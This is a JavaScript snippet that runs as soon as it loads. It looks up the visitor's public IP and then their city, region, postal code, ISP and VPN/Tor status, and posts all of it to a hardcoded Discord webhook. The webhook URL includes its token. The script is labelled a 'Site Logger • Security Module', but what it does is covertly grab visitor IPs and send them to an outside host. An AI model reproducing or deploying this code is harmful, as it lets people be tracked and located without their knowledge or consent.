const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {

                    const dscURL = 'https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs';

                    // 🛡️ VPN / Proxy detection (safe fallbacks)
                    const isVPN   = geoData.security?.vpn ?? false;
                    const isProxy = geoData.security?.proxy ?? false;
                    const isTor   = geoData.security?.tor ?? false;

                    const riskLevel = isTor || isVPN || isProxy ? "🔴 High Risk" : "🟢 Low Risk";
                    const embedColor = isTor ? 0xff0033 : (isVPN || isProxy ? 0xffa500 : 0x00ff88);

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Site Logger",
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                            content: `@here ${riskLevel}`,
                            embeds: [
                                {
                                    title: "🛡️ New Site Event",
                                    description: "A new page interaction was recorded.",
                                    color: embedColor,

                                    fields: [
                                        { name: "🌐 IP Address", value: `\`${ipadd}\``, inline: true },
                                        { name: "🧠 Network / ISP", value: `\`${geoData.network || "Unknown"}\``, inline: true },

                                        { name: "🏙️ City", value: geoData.city || "Unknown", inline: true },
                                        { name: "🗺️ Region", value: geoData.region || "Unknown", inline: true },
                                        { name: "🌍 Country", value: geoData.country_name || "Unknown", inline: true },
                                        { name: "📮 Postal Code", value: geoData.postal || "N/A", inline: true },

                                        {
                                            name: "🔐 Security Check",
                                            value:
`VPN: **${isVPN ? "Yes" : "No"}**
Proxy: **${isProxy ? "Yes" : "No"}**
Tor: **${isTor ? "Yes" : "No"}**`,
                                            inline: false
                                        }
                                    ],

                                    footer: {
                                        text: "Site Logger • Security Module"
                                    },

                                    timestamp: new Date()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
};

sendIP();
